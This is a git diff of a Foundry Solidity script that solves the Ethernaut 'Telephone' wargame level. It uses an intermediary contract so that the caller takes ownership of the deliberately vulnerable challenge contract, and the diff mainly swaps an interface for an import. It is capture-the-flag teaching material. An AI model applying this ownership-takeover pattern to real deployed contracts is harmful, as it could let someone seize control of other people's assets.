@@ -4,6 +4,9 @@ pragma solidity 0.8.21;
 import {Script, console2} from "forge-std/Script.sol";
 import {EthernautHelper} from "../setup/EthernautHelper.sol";
 
+// Import challenge contract here
+import {Telephone} from "../../challenge-contracts/04-Telephone.sol";
+
 contract TelephoneSolution is Script, EthernautHelper {
     address constant LEVEL_ADDRESS = 0x2C2307bb8824a0AbBf2CC7D76d8e63374D2f8446;
     uint256 heroPrivateKey = vm.envUint("PRIVATE_KEY");
@@ -23,9 +26,9 @@ contract TelephoneSolution is Script, EthernautHelper {
         //         TelephoneCaller contract calls `changeOwner()` function in Telephone contract;
         caller.invokeChangeOwner();
 
-        // Step 3: Confirm that `heroAddress` have become owner of the Telephone contract.
+        // Step 3: Confirm that caller `heroAddress` has successfully obtained ownership of the Telephone contract.
         address heroAddress = vm.addr(heroPrivateKey);
-        ITelephone telephone = ITelephone(challengeInstance);
+        Telephone telephone = Telephone(challengeInstance);
         require(heroAddress == telephone.owner(), "Owner check failed");
         ////////////////////////////////////////////////////////////////////////////////////
         // End of Ric Li C's Solution
@@ -41,24 +44,14 @@ contract TelephoneSolution is Script, EthernautHelper {
 }
 
 ////////////////////////////////////////////////////////////////////////////////////
-// Start of Ric Li C's Solution (Extra codes)
+// Start of Ric Li C's Solution (Extra Contract)
+// Additional contract codes to help solve this puzzle
 ////////////////////////////////////////////////////////////////////////////////////
-// Below are extra codes to help solve this puzzle
-
-// Define the interface for the Telephone contract
-interface ITelephone {
-    // Function to change the owner
-    function changeOwner(address _owner) external;
-
-    // Function to get the current owner
-    function owner() external view returns (address);
-}
-
 contract TelephoneCaller {
-    ITelephone telephone;
+    Telephone telephone;
 
     constructor(address _telephoneAddress) {
-        telephone = ITelephone(_telephoneAddress);
+        telephone = Telephone(_telephoneAddress);
     }
 
     function invokeChangeOwner() public {
@@ -66,5 +59,5 @@ contract TelephoneCaller {
     }
 }
 ////////////////////////////////////////////////////////////////////////////////////
-// End of Ric Li C's Solution (Extra codes)
+// End of Ric Li C's Solution (Extra Contract)
 ////////////////////////////////////////////////////////////////////////////////////
